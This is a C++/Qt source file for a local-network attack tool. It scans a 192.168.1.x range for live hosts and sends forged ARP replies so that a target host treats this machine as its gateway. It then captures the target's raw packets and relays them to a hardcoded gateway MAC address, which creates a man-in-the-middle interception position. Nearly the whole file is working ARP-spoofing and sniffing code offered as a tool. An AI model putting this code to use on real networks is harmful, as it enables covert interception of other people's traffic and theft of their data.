#include "hacker.h"
#include "arpsender.h"
#include "mainwindow.h"
#include <QDebug>
#include <QFile>

Hacker::Hacker(QObject *parent)
    : main_ui((MainWindow*)parent),
      ipResolver(NULL),
      arpSender(NULL),
      getOnlineIPsThread(NULL),
      sendArpSnoofingThread(NULL),
      getPacketsThread(NULL)
{
}

Hacker::~Hacker()
{
    if(getOnlineIPsThread != NULL){
        delete getOnlineIPsThread;
    }
    if(arpSender != NULL){
        delete arpSender;
    }
    if(ipResolver != NULL){
        delete ipResolver;
    }
    if(sendArpSnoofingThread != NULL){
        delete sendArpSnoofingThread;
    }
    if(getPacketsThread != NULL){
        delete getPacketsThread;
    }
}

//Called by UI thread.
//create a thread to get online ips.
void Hacker::getOnlineIPs(int startIP, int endIP)
{
    if(getOnlineIPsThread == NULL)
        getOnlineIPsThread = new GetOnlineIPsThread(this, startIP, endIP);

    //When one ip is found or scan is finished, tell the UI.
    connect(getOnlineIPsThread, SIGNAL(foundOneOnlineIP(QString)), main_ui, SLOT(oneOnlineIPFound(QString)));
    connect(getOnlineIPsThread, SIGNAL(scanHasFinished()), main_ui, SLOT(scanDone()));
    connect(getOnlineIPsThread, SIGNAL(scanProgressForward(int)), main_ui, SLOT(updateProgress(int)));

    getOnlineIPsThread->start();
}

QString Hacker::getHostname(const QString &ip)
{
    if(ipResolver == NULL)
        ipResolver = new IPResolver();
    QString hostname = ipResolver->getHostname(ip);
    return hostname;
}

/* Query the MAC address of destination ip. */
void Hacker::queryMacAddress(const QString& dest_ip)
{
    if(arpSender == NULL){
        arpSender = new ARPSender();
    }
    connect(arpSender, SIGNAL(macAddressReturned(QString)), main_ui, SLOT(showMacAddress(QString)));
    arpSender->queryMacAddress(dest_ip);
}

/* Lie to the dest_ip that we're the gateway */
void Hacker::makeHostRedirectToMe(const QString& dest_ip)
{
#define GATEWAY_IP "192.168.1.1"
    if(arpSender == NULL){
        arpSender = new ARPSender();
    }
    if(sendArpSnoofingThread == NULL){
        sendArpSnoofingThread = new SendArpSnoofingThread(arpSender, dest_ip);
    }

    //When click "stop" from UI, sendArpSnoofingThread should react to that signal and stop sending.
    connect(main_ui, SIGNAL(stopHacking()), sendArpSnoofingThread, SLOT(stopSendFakedARP()));

    sendArpSnoofingThread->start();

    if(getPacketsThread == NULL){
        getPacketsThread = new GetPacketsThread();
    }
    getPacketsThread->start();
}

//----------------------------------GetOnlineIPsThread------------------------------------
GetOnlineIPsThread::GetOnlineIPsThread(QObject *parent, int startIP, int endIP)
    : QThread(parent), icmpSocket(new IcmpSocket()),
      startIP(startIP), endIP(endIP)
{
}

GetOnlineIPsThread::~GetOnlineIPsThread()
{
    delete icmpSocket;
}

//The function of getting online ip list is implemented here.
//The IcmpSocket is used to send ICMP packets to corresponding ip for reachable test.
//And if one online ip is found it'll emit foundOneOnlineIP() signal to update UI.
//And when all ips are scaned it'll emit scanHasFinished() signal.
void GetOnlineIPsThread::run()
{
    int pace = 100 / (endIP - startIP + 1);
    int progress = 0;
    for(int i = startIP; i <= endIP; i++){
        QString testIP= "192.168.1.";
        testIP.append((QString::number(i)));
        if(icmpSocket->ping(testIP)){
            emit foundOneOnlineIP(testIP);
        }
        //update progress information
        progress += pace;
        emit scanProgressForward(progress);
    }
    //In case that (endIP - startIP + 1) won't be able to be divided by 100.
    if(progress < 100)
        emit scanProgressForward(100);

    emit scanHasFinished();
}

//----------------------------------SendARPSnoofingThread-------------------
SendArpSnoofingThread::SendArpSnoofingThread(ARPSender *arpSender, const QString &dest_ip)
    : arpSender(arpSender), dest_ip(dest_ip)
{
}

void SendArpSnoofingThread::run()
{
    if(arpSender != NULL){
        arpSender->sendFakedARP(dest_ip, GATEWAY_IP);
    }else{
        qDebug() << "Need ArpSender instance.";
    }
}

void SendArpSnoofingThread::stopSendFakedARP()
{
    arpSender->stopSendFakedARP();
}

//--------------------------------GetPacketThread----------------
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
//#include <linux/ip.h>

void GetPacketsThread::run()
{
    getPackets();
}

void GetPacketsThread::getPackets()
{
    //To receive ip packets, we need a fd and a sockaddr_ll
    int victim_fd = -1;
    struct sockaddr_ll eth_info;
    memset(&eth_info, 0, sizeof(eth_info));

    eth_info.sll_family = PF_PACKET;
    eth_info.sll_ifindex = if_nametoindex(NIC_NAME);
    eth_info.sll_protocol = htons(ETH_P_IP);

    victim_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\
    if(bind(victim_fd, (struct sockaddr*)(&eth_info), sizeof(eth_info))){
        perror("bind");
        return;
    }

    //To resend ip packets, we need a socket connected with gateway
    int gateway_fd = -1;
    struct sockaddr_ll eth_gateway_info;

    memset(&eth_gateway_info, 0, sizeof(eth_gateway_info));
    eth_gateway_info.sll_family = PF_PACKET;
    eth_gateway_info.sll_ifindex = if_nametoindex(NIC_NAME);
    eth_gateway_info.sll_halen = ETH_ALEN;
    eth_gateway_info.sll_pkttype = PACKET_HOST;
    eth_gateway_info.sll_protocol = htons(ETH_P_IP);

    gateway_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if(bind(gateway_fd, (struct sockaddr*)(&eth_gateway_info), sizeof(eth_gateway_info))){
        perror("bind");
        return;
    }

    char packet_buf[ETH_FRAME_LEN] = {0};
    int received_num = 0;

    struct ip *ip_packet = (struct ip*)&(packet_buf[ETH_ALEN + ETH_ALEN + 2]);
    struct ethhdr *eth_hdr = (struct ethhdr*)&packet_buf;

    char gateway_mac[ETH_ALEN] = {0xBC, 0xD1, 0x77, 0x56, 0x73, 0xDC};
//    char dest_mac[] = {0x94, 0xDB, 0xC9, 0x07, 0x5E, 0xC4};

    while((received_num = recvfrom(victim_fd, packet_buf, sizeof(packet_buf), 0, NULL, NULL)) > 0){
//        QFile f("/tmp/ss.pcap");
//        f.open(QIODevice::WriteOnly);
//        f.write(buf, num);
//        f.close();

        char src[50], dest[50];
        inet_ntop(AF_INET, &ip_packet->ip_src, src, sizeof(src));
        inet_ntop(AF_INET, &ip_packet->ip_dst, dest, sizeof(dest));

#define TEST_TARGET "192.168.1.103"
        //If it's the target ip, change its destination mac address to gateway.
        if(strncmp(src, TEST_TARGET, strlen(TEST_TARGET)) == 0){
            qDebug() << "Received " << received_num << " bytes. " << src << " => " << dest << " protocol: " << ip_packet->ip_p;
            for(int i = 0; i < ETH_ALEN; i++){
                eth_hdr->h_dest[i] = gateway_mac[i];
            }

            int num;
            if((num = sendto(gateway_fd, packet_buf, received_num, 0, (struct sockaddr*)&eth_gateway_info, sizeof(eth_gateway_info))) <= 0){
                perror("redirct send");
                return;
            }
            qDebug() << "redirect " << num << " bytes.";
        }
    }
    close(victim_fd);
    close(gateway_fd);
}
